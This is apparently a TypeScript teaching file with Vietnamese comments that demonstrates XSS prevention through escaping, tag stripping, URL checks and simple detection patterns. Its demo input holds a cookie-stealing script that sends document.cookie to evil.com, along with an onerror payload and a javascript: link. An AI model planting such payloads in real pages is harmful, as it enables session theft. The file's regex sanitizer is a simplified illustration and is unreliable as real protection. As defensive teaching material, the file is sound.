/**
 * 5.4.3 XSS Prevention — Escape + Sanitize input
 *
 * Minh họa:
 * - Escape HTML: output luôn là văn bản an toàn (chống Reflected/Stored XSS)
 * - Sanitize input: loại bỏ tag/phần tử nguy hiểm trước khi lưu/hiển thị
 * - Chặn URL nguy hiểm (javascript:) và attribute on* (onerror, onclick...)
 */

// ──────────────────────────────── Sanitizer ─────────────────────────────────
class XssSanitizer {
  private static readonly ENTITY_MAP: Record<string, string> = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  };

  // ✅ Escape — chuyển ký tự đặc biệt thành entity, browser hiển thị như text
  static escapeHtml(input: string): string {
    return input.replace(/[&<>"']/g, (ch) => this.ENTITY_MAP[ch] ?? ch);
  }

  // ✅ Sanitize — xóa <script> và mọi tag, giữ lại nội dung text
  static sanitizeText(input: string): string {
    return input
      .replace(/<script[\s\S]*?<\/script>/gi, "")
      .replace(/<[^>]+>/g, "")
      .trim();
  }

  // ✅ Kiểm tra URL href/src — chặn javascript:, data:, vbscript:
  static isSafeUrl(url: string): boolean {
    const lower = url.trim().toLowerCase();
    if (/^(javascript|data|vbscript):/.test(lower)) return false;
    return !/^[\s]*[^a-z0-9+.\-:/?#@]/.test(url);
  }

  // ✅ Phát hiện chuỗi "nguy hiểm" điển hình trong input
  static detectDanger(input: string): string[] {
    const signs: string[] = [];
    if (/<script/i.test(input)) signs.push("có <script>");
    if (/\bon\w+\s*=/i.test(input)) signs.push("có thuộc tính on* (onerror/onclick)");
    if (/javascript:/i.test(input.toLowerCase())) signs.push("có javascript:");
    return signs;
  }
}

// ────────────────────────────────── Demo ────────────────────────────────────
console.log("=== XSS Prevention Demo ===");
console.log("");

const evilInput = `Chào! <script>fetch('https://evil.com?c='+document.cookie)</script>
<img src=x onerror="stealCookie()">`;
console.log(`1️⃣ Input ĐỘC từ user (comment forum):`);
console.log(`   ${evilInput}`);
console.log(`   🔍 Detect: ${XssSanitizer.detectDanger(evilInput).join(", ") || "không phát hiện"}`);
console.log("");

console.log("2️⃣ Escape HTML (hiển thị an toàn):");
console.log(`   ${XssSanitizer.escapeHtml(evilInput)}`);
console.log("");
console.log("   ⚠️ Lưu ý: escape CHỈ an toàn khi output ĐƯỢC hiểu là text. Nếu cần hiển thị HTML hợp lệ → dùng sanitize whitelist như DOMPurify.");
console.log("");

console.log("3️⃣ Sanitize text (xóa tag, chỉ giữ text):");
console.log(`   ${XssSanitizer.sanitizeText(evilInput)}`);
console.log("");

console.log("4️⃣ Kiểm tra URL href (`javascript:` là nguy hiểm):");
const maliciousLink = "javascript:alert(1)";
const goodLink = "https://example.com/page";
console.log(`   "javascript:alert(1)"      → an toàn? ${XssSanitizer.isSafeUrl(maliciousLink)}`);
console.log(`   "https://example.com/page" → an toàn? ${XssSanitizer.isSafeUrl(goodLink)}`);
console.log("");

console.log("✅ XSS bị chặn bằng nhiều lớp: escape output (text), sanitize input khi lưu, cảnh giác URL và thuộc tính on* — kết hợp cùng CSP & HTTP-only cookie.");
export {};